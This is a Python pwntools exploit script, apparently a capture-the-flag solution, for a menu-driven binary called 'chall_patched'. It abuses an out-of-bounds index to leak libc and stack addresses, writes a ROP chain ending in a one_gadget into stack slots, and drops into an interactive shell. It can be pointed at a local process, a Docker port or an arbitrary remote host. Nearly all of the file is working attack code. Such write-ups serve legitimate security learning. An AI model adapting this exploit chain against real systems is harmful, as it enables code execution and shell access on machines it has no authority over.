#!/usr/bin/env python3 

from pwn import *
import struct

exe = context.binary = ELF("./chall_patched", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
context.log_level = 'debug'
gs = '''
'''

def init():
    if args.LOCAL:
        p = process(exe.path)
        gdb.attach(p, gdbscript=gs)
    elif args.DOCKER:
        p = remote("localhost", 1975)
    elif args.REMOTE:
        p = remote(sys.argv[1], sys.argv[2])
    
    return p

p = init()

def convert(value):
    struct.pack("<q", value)

# set current to 0x7ffffff1
p.sendlineafter(b"Choice: ", b"7")
p.sendlineafter(b"Choice: ", b"1")
p.sendlineafter(b"(y/n)? ", b"n")
p.sendlineafter(b"number: ", b"100")
p.sendlineafter(b"number: ", b"100")
p.sendlineafter(b"(Y/N) ", b"Y")
p.sendlineafter(b"index: ", b"0")

# set idx to 0x7ffffff1
p.sendlineafter(b"Choice: ", b"9")

# leak libc
p.sendlineafter(b"Choice: ", b"5")
p.sendlineafter(b"index: ", b"109")
p.sendlineafter(b"Choice: ", b"4")
p.recvuntil(b"number: ")
leak = int(p.recvline()[:-1])
libc_base = leak - 0x29d90
log.info(f"libc base: {hex(libc_base)}")

# leak stack
p.sendlineafter(b"Choice: ", b"5")
p.sendlineafter(b"index: ", b"102")
p.sendlineafter(b"Choice: ", b"4")
p.recvuntil(b"number: ")
leak_stack = int(p.recvline()[:-1])
log.info(f"stack leak: {hex(leak_stack)}")

# ROP
og = libc_base + 0xebd3f
xor_rax = libc_base + 0x00000000000baaf9
max_int = 0x7fffffff
log.info(f"og: {hex(og)}")
log.info(f"xor_rax = {hex(xor_rax)}")

def store(dis):
    p.sendlineafter(b"Choice: ", b"7")
    p.sendlineafter(b"Choice: ", b"1")
    p.sendlineafter(b"(y/n)? ", b"n")
    p.sendlineafter(b"number: ", b"0")
    p.sendlineafter(b"number: ", str(dis))
    p.sendlineafter(b"(Y/N) ", b"Y")
    p.sendlineafter(b"index: ", b"0")

todo = [leak_stack , xor_rax, og]
offset = 106
for i in range(len(todo)):
    p.sendlineafter(b"Choice: ", b"5")
    p.sendlineafter(b"index: ", str(offset))
    p.sendlineafter(b"Choice: ", b"2")
    p.sendline(str(todo[i]))
    offset += 1

p.sendlineafter(b"Choice: ", b"10")

p.interactive()
